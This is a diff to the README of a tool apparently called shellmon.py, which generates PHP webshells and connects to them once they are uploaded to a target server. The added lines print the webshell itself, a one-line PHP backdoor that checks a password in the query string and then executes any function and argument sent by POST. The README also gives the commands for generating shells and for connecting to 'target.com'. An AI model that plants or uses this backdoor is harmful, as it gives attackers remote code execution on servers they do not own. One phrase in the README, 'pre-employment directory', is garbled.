@@ -34,6 +34,12 @@ python shellmon.py -p yourpassword --generate
 ```
 webshell files will be automatically saved in your current pre-employment directory, filenames will be auto-generated with number format 0-9 and use .php extension.
 
+Content webshell:
+```php
+<?=(isset($_GET[0])&&$_GET[0]=="yourpassword"?:die("0"))&&@$_POST[0]($_POST[1]);
+```
+
+
 Furthermore, if you want to connect your uploaded webshell to the target server, you just need to type this command on the terminal screen
 ```bash
 python shellmon.py -u https://target.com -p yourpassword
